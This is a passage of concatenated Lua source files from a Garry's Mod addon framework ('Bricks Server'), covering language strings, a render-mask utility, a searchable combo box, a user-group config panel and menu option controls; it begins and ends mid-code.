    ["spawned_shipment"] = { true, true },
    ["spawned_weapon"] = { true, true },
    ["bricks_server_ink"] = { false, true },
    ["bricks_server_resource"] = { false, true },
    ["bricks_server_resource_wood"] = { false, true },
    ["bricks_server_resource_scrap"] = { false, true },
    ["bricks_server_resource_iron"] = { false, true },
    ["bricks_server_resource_plastic"] = { false, true },
    ["bricks_server_resource_ruby"] = { false, true },
    ["bricks_server_resource_diamond"] = { false, true }
}

--[[ NPCS ]]--
BRICKS_SERVER.BASECONFIG.NPCS = BRICKS_SERVER.BASECONFIG.NPCS or {}
--PATH addons/____bricks_framework/lua/bricks_server/languages/bricks_server/english.lua:
BRICKS_SERVER.Func.AddLanguageStrings( "english", {
    ["search"] = "Search",
    ["invalidPlayerProfile"] = "Invalid player profile requested!",
    ["unbound"] = "UNBOUND",
    ["themes"] = "Themes",
    ["groups"] = "Groups",
    ["general"] = "General",
    ["itemWhitelisting"] = "Item Whitelisting",
    ["rarities"] = "Rarities",
    ["languages"] = "Languages",
    ["disabled"] = "Disabled",
    ["enabled"] = "Enabled",
    ["purchase"] = "Purchase",
    ["profile"] = "Profile",
    ["view"] = "View",
    ["admin"] = "Admin",
    ["noToolPermission"] = "You don't have permission to use this tool.",
    ["settings"] = "Settings",
    ["players"] = "Players",
    ["modules"] = "Modules",

    ["userGroupEditor"] = "User Group Editor",
    ["addNewGroup"] = "Add new group",
    ["newUserGroup"] = "What should new user group be?",
    ["groupName"] = "GroupName",

    ["custom"] = "Custom",
    ["addNew"] = "Add new",
    ["material"] = "Material",
    ["directImage"] = "Enter a direct image URL below.",
    ["default"] = "Default",
    ["selectMaterial"] = "You must select a material!",

    ["errorNoText"] = "ERROR: NO TEXT",
    ["selectOption"] = "Select option",
    ["selectValue"] = "Please select a value.",
    ["selectColor"] = "Please choose a color.",
    ["configSaved"] = "Config saved!",
    ["cmdNoPermission"] = "You don't have permission to use this command.",
    ["entityPosUpdated"] = "Entity positions updated.",
    ["noEntitiesSpawned"] = "No saved Entities were spawned.",
    ["xEntitiesSpawned"] = "%d saved Entities were spawned.",
    ["error"] = "ERROR",

    ["seconds"] = "%d seconds",
    ["second"] = "%d second",
    ["minutes"] = "%d minutes",
    ["minute"] = "%d minute",
    ["hours"] = "%d hours",
    ["hour"] = "%d hour",
    ["days"] = "%d days",
    ["day"] = "%d day",

    ["noRarity"] = "No rarity",

    ["config"] = "Config",
    ["edit"] = "Edit",
    ["editColor"] = "Edit Color",
    ["editName"] = "Edit Name",
    ["remove"] = "Remove",
    ["name"] = "Name",
    ["description"] = "Description",
    ["model"] = "Model",
    ["icon"] = "Icon",
    ["type"] = "Type",
    ["price"] = "Price",
    ["group"] = "Group",
    ["category"] = "Category",
    ["color"] = "Color",
    ["invalidType"] = "Invalid type.",
    ["invalidOption"] = "Invalid option.",
    ["invalidChoice"] = "Invalid choice.",
    ["invalidGroup"] = "Invalid group.",
    ["invalidPlayer"] = "Invalid player.",
    ["true"] = "TRUE",
    ["false"] = "FALSE",
    ["noDescription"] = "No description",
    ["other"] = "Other",
    ["completed"] = "Completed",
    ["close"] = "Close",
    ["main"] = "Main",
    
    ["valueQuery"] = "What should the %s be?",
    ["dataValueQuery"] = "What data should this be?",
    ["newNameQuery"] = "What should the new name be?",
    ["newDescriptionQuery"] = "What should the new description be?",
    ["newModelQuery"] = "What should the new model be?",
    ["newIconQuery"] = "What should the new icon be?",
    ["newColorQuery"] = "What should the new color be?",
    ["npcTypeQuery"] = "What type should this NPC be?",
    ["newTypeQuery"] = "What should the new type be",
    ["groupRequirementQuery"] = "What should the group requirement be?",
    ["levelRequirementQuery"] = "What should the level requirement be?",
    ["newPriceQuery"] = "What should the new price be?",
    ["newCategoryQuery"] = "What should the new category be?",
    ["npcType"] = "NPC Type",

    ["npcEditor"] = "NPC Editor",
    ["addNPC"] = "Add NPC",
    ["newNPC"] = "New NPC",

    ["ok"] = "OK",
    ["cancel"] = "Cancel",
    ["save"] = "Save",
    ["confirm"] = "Confirm",
    ["nil"] = "NIL",
    ["none"] = "None",
    ["selected"] = "Selected",
    ["unselected"] = "Unselected",
    ["add"] = "Add",

    ["shootyStick"] = "A shooty stick!",
    ["permanent"] = "Permanent",
    ["tierX"] = "(Tier %d)",
    ["someDescription"] = "Some description.",
    ["invalidNPC"] = "BRICKS SERVER ERROR: Invalid NPC",

    ["disconnected"] = "Disconnected",
    ["profileView"] = "Profile View",
    ["loading"] = "Loading",
    ["statistics"] = "Statistics",
    ["steamID64"] = "SteamID64",
    ["donationRank"] = "Donation Rank",
    ["staffRank"] = "Staff Rank",
    ["currentJob"] = "Current Job",
    ["wallet"] = "Wallet",
    ["level"] = "Level",
    ["levelX"] = "Level %d",
    ["experience"] = "Experience",
    ["exp"] = "EXP",
    ["money"] = "Money",
    ["playerLogs"] = "Player Logs",
    ["deleteLogs"] = "Delete logs",
    ["xLogs"] = "%d logs",
    ["xAdminGroups"] = "%d Admin Groups",
    ["editUserGroups"] = "Edit User Groups",
    ["newGroupColor"] = "What should the new group color be?",
    ["newGroupName"] = "What should new group name be?",
    ["groupAlreadyExists"] = "That group already exists!",
    ["whitelist"] = "Whitelist",
    ["unWhitelist"] = "UnWhitelist",
    ["addCustom"] = "Add custom",
    ["entClassWhitelist"] = "What entity class would you like to whitelist?",
    ["entClassAlreadyOnList"] = "This entity class is already on the list!",
    ["changesServerRestart"] = "Some changes will not take effect until the server is restarted!",
    ["comingSoon"] = "Coming Soon!",
    ["features"] = "FEATURES",
    ["addNewRarity"] = "Add new rarity",
    ["newRarity"] = "New Rarity",
    ["needToAddRarity"] = "You need to add a rarity type first!",
    ["whatRarityItem"] = "What rarity should this item be?",
    ["invalidRarity"] = "Invalid rarity.",
    ["rarityAlreadyExists"] = "A rarity with this name already exists!",
    ["themeColorX"] = "Theme - Color %d",
    ["themeTextColor"] = "Theme - Text Color",
    ["presetAccents"] = "Preset accents",
    ["presetBackgrounds"] = "Preset backgrounds",
    ["resetToBaseThemes"] = "Reset to base themes",
    ["resetToCurrentThemes"] = "Reset to current themes",
    ["toggle"] = "Toggle",
    ["menu"] = "Menu",
    ["emptyValue"] = "EMPTY VALUE",
    ["newValueQuery"] = "What should the new value be?",
    ["pressKey"] = "PRESS A KEY",

    ["entityPlacer"] = "Entity Placer",
    ["invalidEntityType"] = "Invalid Entity type, choose a valid one from the tool menu.",
    ["entityPlaced"] = "Entity succesfully placed.",
    ["entityRemoved"] = "Entity succesfully removed.",
    ["canOnlyUseToolEntity"] = "You can only use this tool to remove/create an entity.",
    ["entityType"] = "Entity Type",
    ["entityPlacerDescription"] = "Places and removes entities from Brick's Server and saves their positions. LeftClick - place. RightClick - remove.",
    ["entityPlacerDescriptionSmall"] = "Places and removes entities",
    ["entityPlacerInstructions"] = "LeftClick - place, RightClick - remove.",

    ["npcPlacer"] = "NPC Placer",
    ["npcPlaced"] = "NPC succesfully placed.",
    ["invalidNPCType"] = "Invalid NPC type, choose a valid one from the tool menu.",
    ["npcRemoved"] = "NPC succesfully removed.",
    ["errorNotNPC"] = "You can only use this tool to remove/create an NPC.",
    ["npcPlacerDescription"] = "Places and removes NPCs from Brick's Server, LeftClick - place, RightClick - remove.",
    ["npcPlacerDescriptionSmall"] = "Places and removes NPCs from Brick's Server.",

    ["inventory"] = "Inventory",
    ["player"] = "Player",
    ["drop"] = "Drop",
    ["use"] = "Use",
    ["dropAll"] = "Drop all",
    ["delete"] = "Delete",
    ["create"] = "Create",
    ["createNew"] = "CREATE NEW",
    ["createNewLanguage"] = "Create a new language.",

    ["itemRarities"] = "Item Rarities",
} )
--PATH addons/____bricks_framework/lua/bricks_server/core/shared/sh_player.lua:
BRICKS_SERVER.PLAYERMETA = {}
BRICKS_SERVER.PLAYERMETA.__index = BRICKS_SERVER.PLAYERMETA

local playerMeta = FindMetaTable( "Player" )

function playerMeta:BRS()
	if( SERVER ) then
		if( not self ) then return false end

		if( not self.BRS_PLAYERMETA ) then
			self.BRS_PLAYERMETA = {
				Player = self
			}

			setmetatable( self.BRS_PLAYERMETA, BRICKS_SERVER.PLAYERMETA )
		end

		return self.BRS_PLAYERMETA
	else
		return BRICKS_SERVER.LOCALPLYMETA
	end
end

-- GENERAL FUNCTIONS --
function BRICKS_SERVER.PLAYERMETA:GetUserID()
	return self.UserID or 0
end
--PATH addons/____bricks_framework/lua/bricks_server/core/client/cl_bmasks.lua:
if( not BRICKS_SERVER.BMASKS ) then
    BRICKS_SERVER.BMASKS = {} --Global table, access the functions here

    BRICKS_SERVER.BMASKS.Materials = {} --Cache materials so they dont need to be reloaded
    BRICKS_SERVER.BMASKS.Masks = {} --A table of all active mask objects, you should destroy a mask object when done with it

    --The material used to draw the render targets
    BRICKS_SERVER.BMASKS.MaskMaterial = CreateMaterial("!bluemask","UnlitGeneric",{
        ["$translucent"] = 1,
        ["$vertexalpha"] = 1,
        ["$alpha"] = 1,
    })

    --Creates a mask with the specified options
    --Be sure to pass a unique maskName for each mask, otherwise they will override each other
    BRICKS_SERVER.BMASKS.CreateMask = function(maskName, maskPath, maskProperties)
        local mask = {}

        --Set mask name
        mask.name = maskName

        --Load materials
        if BRICKS_SERVER.BMASKS.Materials[maskPath] == nil then
            BRICKS_SERVER.BMASKS.Materials[maskPath] = Material(maskPath, maskProperties)
        end

        --Set the mask material
        mask.material = BRICKS_SERVER.BMASKS.Materials[maskPath]

        --Create the render target
        mask.renderTarget = GetRenderTargetEx("BRICKS_SERVER.BMASKS:"..maskName, ScrW(), ScrH(), RT_SIZE_FULL_FRAME_BUFFER, MATERIAL_RT_DEPTH_NONE, 2, CREATERENDERTARGETFLAGS_UNFILTERABLE_OK, IMAGE_FORMAT_RGBA8888)

        BRICKS_SERVER.BMASKS.Masks[maskName] = mask

        return maskName
    end

    --Call this to begin drawing with a mask.
    --After calling this any draw call will be masked until you call EndMask(maskName)
    BRICKS_SERVER.BMASKS.BeginMask = function(maskName)
        --FindMask
        if BRICKS_SERVER.BMASKS.Masks[maskName] == nil then 
            print("Cannot begin a mask without creating it first!") 
            return false
        end

        --Store current render target
        BRICKS_SERVER.BMASKS.Masks[maskName].previousRenderTarget = render.GetRenderTarget() 
        
        --Confirgure drawing so that we write to the masks render target
        render.PushRenderTarget(BRICKS_SERVER.BMASKS.Masks[maskName].renderTarget)
        render.OverrideAlphaWriteEnable( true, true )
        render.Clear( 0, 0, 0, 0 ) 
    end

    --Ends the mask and draws it
    --Not calling this after calling BeginMask will cause some really bad effects 
    --This done return the render target used, using this you can create other effects such as drop shadows without problems
    --Passes true for dontDraw will result in it not being render and only returning the texture of the result (which is ScrW()xScrH())
    BRICKS_SERVER.BMASKS.EndMask = function(maskName, x, y, sizex, sizey, opacity, rotation, dontDraw)

        dontDraw = dontDraw or false
        rotation = rotation or 0
        opacity = opacity or 255

        --Draw the mask
        render.OverrideBlendFunc( true, BLEND_ZERO, BLEND_SRC_ALPHA, BLEND_DST_ALPHA, BLEND_ZERO )
        surface.SetDrawColor(255,255,255,opacity)
        surface.SetMaterial(BRICKS_SERVER.BMASKS.Masks[maskName].material)
        if rotation == nil or rotation == 0 then
            surface.DrawTexturedRect(x, y, sizex, sizey) 
        else
            surface.DrawTexturedRectRotated(x, y, sizex, sizey, rotation) 
        end
        render.OverrideBlendFunc(false)
        render.OverrideAlphaWriteEnable( false )
        render.PopRenderTarget() 

        --Update material
        BRICKS_SERVER.BMASKS.MaskMaterial:SetTexture('$basetexture', BRICKS_SERVER.BMASKS.Masks[maskName].renderTarget)

        --Clear material for upcoming draw calls
        draw.NoTexture()

        --Only draw if they want is to
        if not dontDraw then
            --Now draw finished result
            surface.SetDrawColor(255,255,255,255) 
            surface.SetMaterial(BRICKS_SERVER.BMASKS.MaskMaterial) 
            render.SetMaterial(BRICKS_SERVER.BMASKS.MaskMaterial)
            render.DrawScreenQuad() 
        end

        return BRICKS_SERVER.BMASKS.Masks[maskName].renderTarget
    end
end
--PATH addons/____bricks_framework/lua/bricks_server/vgui/bricks_server_combo_search.lua:

local PANEL = {}

Derma_Install_Convar_Functions( PANEL )

AccessorFunc( PANEL, "m_bDoSort", "SortItems", FORCE_BOOL )

function PANEL:Init()

	self:SetTall( 40 )
	self:Clear()

	self:SetIsMenu( true )
	self:SetSortItems( true )
	self:SetText( "" )

end

function PANEL:Clear()

	self.Choices = {}
	self.Data = {}
	self.ChoiceIcons = {}
	self.selected = nil

	if ( self.Menu ) then
		self.Menu:Remove()
		self.Menu = nil
	end

end

function PANEL:GetOptionText( id )

	return self.Choices[ id ]

end

function PANEL:GetOptionData( id )

	return self.Data[ id ]

end

function PANEL:GetOptionTextByData( data )

	for id, dat in pairs( self.Data ) do
		if ( dat == data ) then
			return self:GetOptionText( id )
		end
	end

	-- Try interpreting it as a number
	for id, dat in pairs( self.Data ) do
		if ( dat == tonumber( data ) ) then
			return self:GetOptionText( id )
		end
	end

	-- In case we fail
	return data

end

function PANEL:PerformLayout()

end

function PANEL:ChooseOption( value, index )

	if ( self.Menu ) then
		self.Menu:Remove()
		self.Menu = nil
	end

	self.text = value

	-- This should really be the here, but it is too late now and convar changes are handled differently by different child elements
	--self:ConVarChanged( self.Data[ index ] )

	self.selected = index
	self:OnSelect( index, value, self.Data[ index ] )

end

function PANEL:ChooseOptionID( index )

	local value = self:GetOptionText( index )
	self:ChooseOption( value, index )

end

function PANEL:GetSelectedID()

	return self.selected

end

function PANEL:GetSelected()

	if ( !self.selected ) then return end

	return self:GetOptionText( self.selected ), self:GetOptionData( self.selected )

end

function PANEL:OnSelect( index, value, data )

	-- For override

end

function PANEL:AddChoice( value, data, select, icon )

	local i = table.insert( self.Choices, value )

	if ( data ) then
		self.Data[ i ] = data
	end
	
	if ( icon ) then
		self.ChoiceIcons[ i ] = icon
	end

	if ( select ) then

		self:ChooseOption( value, i )

	end

	return i

end

function PANEL:IsMenuOpen()

	return IsValid( self.Menu ) && self.Menu:IsVisible()

end

function PANEL:OpenMenu( pControlOpener )

	if ( pControlOpener && pControlOpener == self.TextEntry ) then
		return
	end

	-- Don't do anything if there aren't any options..
	if ( #self.Choices == 0 ) then return end

	-- If the menu still exists and hasn't been deleted
	-- then just close it and don't open a new one.
	if ( IsValid( self.Menu ) ) then
		self.Menu:Remove()
		self.Menu = nil
	end

	self.Menu = vgui.Create( "bricks_server_dmenu" )

	if ( self:GetSortItems() ) then
		local sorted = {}
		for k, v in pairs( self.Choices ) do
			if( IsValid( self.textEntry ) and not string.find( string.lower( v ), string.lower( self.textEntry:GetValue() ) ) ) then continue end

			local val = tostring( v ) --tonumber( v ) || v -- This would make nicer number sorting, but SortedPairsByMemberValue doesn't seem to like number-string mixing
			if ( string.len( val ) > 1 && !tonumber( val ) && val:StartWith( "#" ) ) then val = language.GetPhrase( val:sub( 2 ) ) end
			table.insert( sorted, { id = k, data = v, label = val } )
		end
		for k, v in SortedPairsByMemberValue( sorted, "label" ) do
			if( IsValid( self.textEntry ) and not string.find( string.lower( v.data ), string.lower( self.textEntry:GetValue() ) ) ) then continue end

			local option = self.Menu:AddOption( v.data, function() self:ChooseOption( v.data, v.id ) end )
			if ( self.ChoiceIcons[ v.id ] ) then
				option:SetIcon( self.ChoiceIcons[ v.id ] )
			end
		end
	else
		for k, v in pairs( self.Choices ) do
			if( IsValid( self.textEntry ) and not string.find( string.lower( v ), string.lower( self.textEntry:GetValue() ) ) ) then continue end

			local option = self.Menu:AddOption( v, function() self:ChooseOption( v, k ) end )
			if ( self.ChoiceIcons[ k ] ) then
				option:SetIcon( self.ChoiceIcons[ k ] )
			end
		end
	end

	local x, y = self:LocalToScreen( 0, self:GetTall() )

	self.Menu:SetMaxHeight( ScrH()*0.2 )
	self.Menu.dontRoundTop = true
	self.Menu:SetMinimumWidth( self:GetWide() )
	self.Menu:Open( x, y, false, self )

end

function PANEL:CloseMenu()

	if ( IsValid( self.Menu ) ) then
		self.Menu:Remove()
	end

end

-- This really should use a convar change hook
function PANEL:CheckConVarChanges()

	if ( !self.m_strConVar ) then return end

	local strValue = GetConVarString( self.m_strConVar )
	if ( self.m_strConVarValue == strValue ) then return end

	self.m_strConVarValue = strValue

	self:SetValue( self:GetOptionTextByData( self.m_strConVarValue ) )

end

function PANEL:Think()

	self:CheckConVarChanges()

	if( not self:IsMenuOpen() and IsValid( self.textEntry ) ) then
		self.textEntry:Remove()
	elseif( self:IsMenuOpen() ) then
		self:CreateTextEntry()
	end
end

function PANEL:CreateTextEntry()
	if( IsValid( self.textEntry ) ) then return end

	self.textEntry = vgui.Create( "bricks_server_search", self )
	self.textEntry:Dock( FILL )
	self.textEntry:RequestFocus()
	self.textEntry.OnChange = function()
		self:OpenMenu()
	end
	self.textEntry.OnMousePressed = function()
		self.textEntry:OnGetFocus()
		self:OpenMenu()
	end
end

function PANEL:SetValue( strValue )

	self.text = strValue

end

function PANEL:DoClick()

	if ( self:IsMenuOpen() ) then
		return self:CloseMenu()
	end

	self:OpenMenu()

end

function PANEL:SetRoundedBoxDimensions( roundedBoxX, roundedBoxY, roundedBoxW, roundedBoxH )
	self.roundedBoxX, self.roundedBoxY, self.roundedBoxW, self.roundedBoxH = roundedBoxX, roundedBoxY, roundedBoxW, roundedBoxH
end

local alpha = 0
function PANEL:Paint( w, h )
	if( self:IsMenuOpen() or self:IsHovered() ) then
		alpha = math.Clamp( alpha+10, 0, 100 )
	else
		alpha = math.Clamp( alpha-10, 0, 100 )
	end

	local roundBottom = not (self:IsMenuOpen() and (self.optionCount or 1) > 0)

	draw.RoundedBoxEx( (self.cornerRadius or 5), (self.roundedBoxX or 0), (self.roundedBoxY or 0), (self.roundedBoxW or w), (self.roundedBoxH or h), (self.backColor or BRICKS_SERVER.Func.GetTheme( 3 )), true, true, roundBottom, roundBottom )

	surface.SetAlphaMultiplier( alpha/255 )
	draw.RoundedBoxEx( (self.cornerRadius or 5), (self.roundedBoxX or 0), (self.roundedBoxY or 0), (self.roundedBoxW or w), (self.roundedBoxH or h), (self.highlightColor or BRICKS_SERVER.Func.GetTheme( 2 )), true, true, roundBottom, roundBottom )
	surface.SetAlphaMultiplier( 1 )

	draw.SimpleText( (self.text or BRICKS_SERVER.Func.L( "none" )), "BRICKS_SERVER_Font20", w*0.5, h*0.5, BRICKS_SERVER.Func.GetTheme( 6, 20+(not self:IsMenuOpen() and 235*(alpha/100) or 0) ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
end

derma.DefineControl( "bricks_server_combo_search", "", PANEL, "DButton" )

--PATH addons/____bricks_framework/lua/bricks_server/vgui/bricks_server_config_groups_old.lua:
local PANEL = {}

function PANEL:Init()

end

function PANEL:FillPanel()
    local removeMat = Material( "materials/bricks_server/delete.png" )
    local editMat = Material( "materials/bricks_server/edit.png" )
    local upMat = Material( "materials/bricks_server/up.png" )
    local downMat = Material( "materials/bricks_server/down.png" )
    
    function self.RefreshPanel()
        self:Clear()

        self.slots = nil
        if( self.grid and IsValid( self.grid ) ) then
            self.grid:Remove()
        end

        for k, v in ipairs( (BS_ConfigCopyTable or BRICKS_SERVER.CONFIG).GENERAL.Groups ) do
            local GroupBack = vgui.Create( "DPanel", self )
            GroupBack:Dock( TOP )
            GroupBack:DockMargin( 0, 0, 0, 5 )
            GroupBack:SetTall( 65 )
            GroupBack:DockPadding( 0, 0, 10, 0 )
            local groupString = ""
            for key, val in pairs( v[2] or {} ) do
                if( groupString == "" ) then
                    groupString = key
                else
                    groupString = groupString .. ", " .. key
                end
            end
            GroupBack.Paint = function( self2, w, h )
                draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 3 ) )
                draw.RoundedBoxEx( 5, 0, 0, 25, h, (v[3] or BRICKS_SERVER.Func.GetTheme( 5 )), true, false, true, false )

                surface.SetDrawColor( BRICKS_SERVER.Func.GetTheme( 3 ) )
                surface.DrawRect( 5, 0, 20, h )

                draw.SimpleText( v[1], "BRICKS_SERVER_Font33", 15, 5, BRICKS_SERVER.Func.GetTheme( 6 ), 0, 0 )
                if( v[2] and table.Count( v[2] ) > 0 ) then
                    draw.SimpleText( "User groups: " .. groupString, "BRICKS_SERVER_Font20", 18, 32, BRICKS_SERVER.Func.GetTheme( 6 ), 0, 0 )
                else
                    draw.SimpleText( BRICKS_SERVER.Func.L( "noUserGroups" ), "BRICKS_SERVER_Font20", 18, 32, BRICKS_SERVER.Func.GetTheme( 6 ), 0, 0 )
                end
            end
            GroupBack.AddButton = function( self2, material, func )
                local button = vgui.Create( "DButton", self2 )
                button:Dock( RIGHT )
                button:SetWide( 36 )
                button:DockMargin( 0, (self2:GetTall()-button:GetWide())*0.5, 0, (self2:GetTall()-button:GetWide())*0.5 )
                button:SetText( "" )
                local changeAlpha = 0
                local x, y = 0, 0
                button.Paint = function( self3, w, h )
                    local toScreenX, toScreenY = self3:LocalToScreen( 0, 0 )
                    if( x != toScreenX or y != toScreenY ) then
                        x, y = toScreenX, toScreenY
                    end
            
                    if( self3:IsDown() ) then
                        changeAlpha = math.Clamp( changeAlpha+10, 0, 125 )
                    elseif( self3:IsHovered() ) then
                        changeAlpha = math.Clamp( changeAlpha+10, 0, 95 )
                    else
                        changeAlpha = math.Clamp( changeAlpha-10, 0, 95 )
                    end
            
                    surface.SetAlphaMultiplier( changeAlpha/255 )
                    draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 2 ) )
                    surface.SetAlphaMultiplier( 1 )
            
                    surface.SetMaterial( material )
                    local size = 24
                    surface.SetDrawColor( 0, 0, 0, 255 )
                    surface.DrawTexturedRect( (h-size)*0.5-1, (h-size)*0.5+1, size, size )
            
                    surface.SetDrawColor( 255, 255, 255, 255 )
                    surface.DrawTexturedRect( (h-size)*0.5, (h-size)*0.5, size, size )
                end
                button.DoClick = function()
                    func( x, y, button:GetWide(), button:GetWide() )
                end
            end

            GroupBack:AddButton( removeMat, function( x, y, w, h )
                table.remove( BS_ConfigCopyTable.GENERAL.Groups, k )
                self.RefreshPanel()
                BRICKS_SERVER.Func.ConfigChange( "GENERAL" )
            end )
            GroupBack:AddButton( editMat, function( x, y, w, h )
                GroupBack.Menu = vgui.Create( "bricks_server_dmenu" )
                GroupBack.Menu:AddOption( BRICKS_SERVER.Func.L( "editUserGroups" ), function()
                    BRICKS_SERVER.Func.CreateGroupEditor( (v[2] or {}), function( userGroups ) 
                        BS_ConfigCopyTable.GENERAL.Groups[k][2] = userGroups or {}
                        self.RefreshPanel()
                        BRICKS_SERVER.Func.ConfigChange( "GENERAL" )
                    end, function() end, true )
                end )
                GroupBack.Menu:AddOption( BRICKS_SERVER.Func.L( "editColor" ), function()
                    BRICKS_SERVER.Func.ColorRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "newGroupColor" ), (v[3] or BRICKS_SERVER.Func.GetTheme( 5 )), function( color ) 
                        BS_ConfigCopyTable.GENERAL.Groups[k][3] = color or BRICKS_SERVER.Func.GetTheme( 5 )
                        self.RefreshPanel()
                        BRICKS_SERVER.Func.ConfigChange( "GENERAL" )
                    end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ) )
                end )
                GroupBack.Menu:AddOption( BRICKS_SERVER.Func.L( "editName" ), function()
                    BRICKS_SERVER.Func.StringRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "newGroupName" ), (v[1] or "GroupName"), function( text ) 
                        for key, val in pairs( BS_ConfigCopyTable.GENERAL.Groups ) do
                            if( val[1] == text ) then
                                notification.AddLegacy( BRICKS_SERVER.Func.L( "groupAlreadyExists" ), 1, 5 )
                                return
                            end
                        end
                        
                        BS_ConfigCopyTable.GENERAL.Groups[k][1] = text
                        self.RefreshPanel()
                        BRICKS_SERVER.Func.ConfigChange( "GENERAL" )
                    end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), false )
                end )
                GroupBack.Menu:Open()
                GroupBack.Menu:SetPos( x+w+5, y+(h*0.5)-(GroupBack.Menu:GetTall()*0.5) )
            end )
            GroupBack:AddButton( downMat, function( x, y, w, h )
                if( k+1 <= #BS_ConfigCopyTable.GENERAL.Groups ) then
                    if( BS_ConfigCopyTable.GENERAL.Groups[k+1] ) then
                        BS_ConfigCopyTable.GENERAL.Groups[k] = BS_ConfigCopyTable.GENERAL.Groups[k+1]
                    end

                    BS_ConfigCopyTable.GENERAL.Groups[k+1] = v
                    self.RefreshPanel()
                    BRICKS_SERVER.Func.ConfigChange( "GENERAL" )
                end
            end )
            GroupBack:AddButton( upMat, function( x, y, w, h )
                if( k-1 >= 1 ) then
                    if( BS_ConfigCopyTable.GENERAL.Groups[k-1] ) then
                        BS_ConfigCopyTable.GENERAL.Groups[k] = BS_ConfigCopyTable.GENERAL.Groups[k-1]
                    end

                    BS_ConfigCopyTable.GENERAL.Groups[k-1] = v
                    self.RefreshPanel()
                    BRICKS_SERVER.Func.ConfigChange( "GENERAL" )
                end
            end )
        end

        local addNewGroup = vgui.Create( "DButton", self )
        addNewGroup:SetText( "" )
        addNewGroup:Dock( TOP )
        addNewGroup:DockMargin( 0, 0, 0, 5 )
        addNewGroup:SetTall( 40 )
        local changeAlpha = 0
        addNewGroup.Paint = function( self2, w, h )
            if( self2:IsDown() ) then
                changeAlpha = math.Clamp( changeAlpha+10, 0, 125 )
            elseif( self2:IsHovered() ) then
                changeAlpha = math.Clamp( changeAlpha+10, 0, 75 )
            else
                changeAlpha = math.Clamp( changeAlpha-10, 0, 75 )
            end
            
            draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 3 ) )
    
            surface.SetAlphaMultiplier( changeAlpha/255 )
            draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 2 ) )
            surface.SetAlphaMultiplier( 1 )
    
            draw.SimpleText( BRICKS_SERVER.Func.L( "addNewGroup" ), "BRICKS_SERVER_Font20", w*0.5, h*0.5, BRICKS_SERVER.Func.GetTheme( 6 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
        end
        addNewGroup.DoClick = function()
            BRICKS_SERVER.Func.StringRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "newGroupName" ), BRICKS_SERVER.Func.L( "groupName" ), function( text ) 
                for key, val in pairs( (BS_ConfigCopyTable or BRICKS_SERVER.CONFIG).GENERAL.Groups ) do
                    if( val[1] == text ) then
                        notification.AddLegacy( BRICKS_SERVER.Func.L( "groupAlreadyExists" ), 1, 5 )
                        return
                    end
                end
                
                table.insert( BS_ConfigCopyTable.GENERAL.Groups, { text, {} } )
                self.RefreshPanel()
                BRICKS_SERVER.Func.ConfigChange( "GENERAL" )
            end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), false )
        end
    end
    self.RefreshPanel()
end

function PANEL:Paint( w, h )
    
end

vgui.Register( "bricks_server_config_groups_old", PANEL, "bricks_server_scrollpanel" )
--PATH addons/____bricks_framework/lua/bricks_server/vgui/bricks_server_dmenuoptioncvar.lua:

local PANEL = {}

DEFINE_BASECLASS( "bricks_server_dmenuoption" )

AccessorFunc( PANEL, "m_strConVar", "ConVar" )
AccessorFunc( PANEL, "m_strValueOn", "ValueOn" )
AccessorFunc( PANEL, "m_strValueOff", "ValueOff" )

function PANEL:Init()

	self:SetChecked( false )
	self:SetIsCheckable( true )

	self:SetValueOn( "1" )
	self:SetValueOff( "0" )

end

function PANEL:Think()

	if ( !self.m_strConVar ) then return end
	local strValue = GetConVarString( self.m_strConVar )

	self:SetChecked( strValue == self.m_strValueOn )

end

function PANEL:OnChecked( b )

	if ( !self.m_strConVar ) then return end

	if ( b ) then
		RunConsoleCommand( self.m_strConVar, self.m_strValueOn )
	else
		RunConsoleCommand( self.m_strConVar, self.m_strValueOff )
	end

end

derma.DefineControl( "bricks_server_dmenuoptioncvar", "", PANEL, "bricks_server_dmenuoption" )

--PATH addons/____bricks_framework/lua/bricks_server/vgui/bricks_server_popupdmenu.lua:
local PANEL = {}

AccessorFunc( PANEL, "m_bDeleteSelf", "DeleteSelf" )

function PANEL:Init()
	self:SetSize( 150, 45 )

	self:SetAlpha( 0 )
	self:AlphaTo( 255, 0.05, 0 )

	self.optionCount = 0
end

local optionH = 45
function PANEL:AddOption( label, onClick, ... )
	local args = { ... }

	self.optionCount = self.optionCount+1

	self:SetTall( self.optionCount*optionH )
	
	local optionButton = vgui.Create( "DButton", self )
	optionButton:Dock( TOP )
	optionButton:SetTall( optionH )
	optionButton:SetText( "" )
	optionButton.OptionPos = self.optionCount
	local alpha = 0
	optionButton.Paint = function( self2, w, h )
		if( self2:IsHovered() ) then
			alpha = math.Clamp( alpha+20, 0, 255 )
		else
			alpha = math.Clamp( alpha-20, 0, 255 )
		end

		if( self2.OptionPos == 1 and self.optionCount > 1 ) then
			draw.RoundedBoxEx( 8, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 3, alpha ), true, true, false, false)
		elseif( self2.OptionPos == self.optionCount and self.optionCount > 1 ) then
			draw.RoundedBoxEx( 8, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 3, alpha ), false, false, true, true)
		elseif( self.optionCount <= 1 ) then
			draw.RoundedBox( 8, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 3, alpha ) )
		else
			surface.SetDrawColor( BRICKS_SERVER.Func.GetTheme( 3, alpha ) )
			surface.DrawRect( 0, 0, w, h )
		end

		draw.SimpleText( label, "BRICKS_SERVER_Font20", w*0.5, h*0.5, BRICKS_SERVER.Func.GetTheme( 6 ), 1, 1 )
	end
    optionButton.DoClick = function()
        onClick( unpack( args ) )
        self:Remove()
    end
end

function PANEL:Open( parent, x, y )
	self.parent = parent

